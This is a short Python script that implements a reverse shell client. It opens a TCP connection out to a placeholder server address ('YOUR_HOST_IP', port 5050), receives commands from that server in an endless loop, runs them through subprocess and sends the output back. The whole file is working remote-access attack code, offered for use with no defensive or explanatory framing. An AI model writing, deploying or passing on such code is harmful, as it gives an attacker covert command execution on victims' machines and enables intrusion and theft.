import os
import socket
import subprocess

host = "YOUR_HOST_IP" #Put Your Server Host Ip 
port = 5050
BUFFER_SIZE = 1024*128

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host,port))

while True:
    cwd = os.getcwd()
    sock.send(cwd.encode('utf-8'))
    command = sock.recv(BUFFER_SIZE).decode('utf-8')
    splited_command = command.split()
    
    if splited_command[0].lower() == "cd":
        try:
            os.chdir(' '.join(splited_command[1:]).strip())
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ""
    
    output = subprocess.getoutput(command)
    if str(output).strip() == '':output = " "
    sock.send(output.encode("utf-8"))

